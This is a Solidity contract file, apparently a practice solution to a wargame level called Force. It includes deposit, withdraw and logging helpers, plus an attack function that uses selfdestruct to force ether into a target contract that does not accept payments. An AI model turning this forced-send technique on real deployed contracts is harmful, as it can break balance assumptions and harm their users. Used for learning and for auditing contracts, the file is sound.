// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Force.sol";
import "hardhat/console.sol";

error HackForce_NotOwner();

contract HackForce {

  Force force;
  // State variables
  mapping(address => uint256) private s_fundersAmount;
  address[] private s_funders;
  address private immutable i_owner;

  // Modifiers
  modifier onlyOwner() {
    require(msg.sender == i_owner);
    if (msg.sender != i_owner) revert HackForce_NotOwner();
    _;
  }

  constructor(address _address) {
    i_owner = msg.sender;
    force = Force(_address);
  }


  function deposit() public payable {
    s_fundersAmount[msg.sender] += msg.value;
    s_funders.push(msg.sender);
  }


  function withdraw() public onlyOwner {

    (bool callSuccess, ) = payable(msg.sender).call{ value: address(this).balance } ("");
        require(callSuccess, "Call failed");
  }

  function depositUsingCall(address payable _to, uint256 amount) public payable {
    // address payable _to = payable(force.address);
    console.log("Address to sent: %s amount: %s", _to, amount);
    (bool sent, /*memory data*/) = _to.call{value: amount}("");
    require(sent, "Deposit failed");

    // (bool sent, bytes memory data) = _to.call{gas :10000, value: msg.value}("func_signature(uint256 args)");
  }


  function getAddreesToAmount(address funder) public view returns (uint256) {
      return s_fundersAmount[funder];
  }

  function getTotalFundersBalance() public view returns (uint256) {
    uint256 total;
    for (uint8 i = 0; i < s_funders.length; i++) {
      address funder = s_funders[i];
      total += s_fundersAmount[funder];
      console.log("Funder %s: amount: %s", funder, s_fundersAmount[funder]);

    }
    return total;
  }

  function attack(address payable _to) public payable {
    // address payable force = payable(address(force));
    selfdestruct(_to);
}
}
